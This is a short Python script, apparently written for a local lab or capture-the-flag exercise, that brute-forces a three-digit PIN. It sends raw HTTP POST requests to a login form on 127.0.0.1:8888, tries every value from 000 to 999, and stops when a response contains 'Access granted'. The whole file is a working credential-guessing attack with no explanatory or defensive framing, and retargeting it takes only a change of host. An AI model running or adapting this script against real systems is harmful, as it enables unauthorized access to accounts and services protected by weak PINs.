import socket
import time

HOST = '127.0.0.1'
PORT = 8888  # Change if needed

for pin in range(1000):
    pin_str = str(pin).zfill(3)
    body = f"pin={pin_str}"

    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )

    print(f"Trying PIN: {pin_str}")  # Shows one-by-one attempt

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(request.encode())

            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk

        response_text = response.decode(errors='ignore')

        if "Access granted" in response_text:
            print(f"\n✅ Found PIN: {pin_str}")
            break

        time.sleep(0.5)  # Slight delay to make each step visible

    except Exception as e:
        print(f"❌ Error trying PIN {pin_str}: {e}")
